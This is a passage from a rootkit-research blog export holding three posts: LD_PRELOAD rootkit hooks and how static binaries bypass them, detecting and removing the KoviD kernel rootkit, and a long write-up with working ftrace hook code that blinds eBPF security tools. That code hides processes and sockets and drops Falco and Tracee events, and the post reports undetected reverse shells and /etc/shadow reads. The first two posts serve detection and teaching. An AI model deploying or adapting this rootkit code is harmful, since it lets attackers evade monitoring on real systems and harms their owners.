[{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security has evolved dramatically. eBPF-based security solutions like Falco, Tracee, Tetragon, and others promised a new era of kernel-level observability that would make rootkits obsolete. The premise was compelling: if you can see everything happening in the kernel, attackers have nowhere to hide.\nThat premise was wrong.\nThis article demonstrates how a kernel module with root privileges can systematically blind eBPF security tools by hooking the very mechanisms they rely on for observability. We present a comprehensive analysis of how modern rootkits can intercept BPF iterators, ringbuffers, perf events, and map operations to become completely invisible to runtime security monitoring.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And several other things.\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall 